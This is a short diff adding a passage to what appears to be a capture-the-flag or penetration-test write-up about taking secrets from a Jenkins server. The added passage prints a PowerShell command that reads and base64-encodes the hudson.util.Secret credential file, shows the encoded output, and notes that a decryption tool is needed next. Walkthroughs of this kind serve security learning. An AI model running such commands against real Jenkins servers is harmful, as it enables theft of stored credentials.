@@ -211,3 +211,10 @@ Ill grab the master key
 
 The secret will need to be base64 encoded on output
 
+```python
+C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test&gt;powershell -c [convert]::ToBase64String((type ../../secrets/hudson.util.Secret -Encoding byte)) 
+gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
+```
+
+Now i have the two things i need i need to find a tool to do this
+
